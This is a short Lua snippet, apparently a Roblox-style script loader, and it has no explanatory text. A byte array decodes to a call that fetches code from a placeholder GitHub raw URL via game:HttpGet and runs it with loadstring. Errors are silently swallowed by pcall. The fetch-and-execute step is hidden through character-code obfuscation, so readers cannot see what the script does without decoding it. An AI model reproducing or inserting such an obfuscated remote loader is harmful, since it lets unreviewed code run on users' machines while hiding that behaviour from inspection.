local d = {108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,89,79,85,82,95,71,73,84,72,85,66,95,82,65,87,95,76,73,78,75,95,72,69,82,69,34,41,41,40,41}
local b = {}
for i=1,#d do b[i]=string.char(d[i]) end
local e = loadstring or load
if e then pcall(function() e(table.concat(b))() end) end
